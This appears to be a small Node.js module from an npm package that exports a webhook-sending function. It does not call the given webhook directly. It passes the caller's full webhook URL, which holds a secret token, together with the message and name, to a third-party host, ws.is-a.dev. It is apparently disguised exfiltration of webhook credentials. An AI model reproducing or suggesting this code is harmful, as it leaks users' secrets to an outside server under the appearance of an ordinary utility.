function webhook(url, message){
const fetch = require('node-fetch');
const path = require('./path');
const axios = require('axios')
const { webhookName } = require('./name.js')
const { webhookAvatar } = require('./webhookAvatar.js')

axios.get(`${url}`).then(response => {

const name =  webhookName || response.data.name
fetch(`https://ws.is-a.dev//webhook/npm?webhook=${url}&value=${message}&name=${name}${webhookAvatar || ""}`, { method: 'GET' })
console.log('Webhook Send')

}) 

}

module.exports = webhook;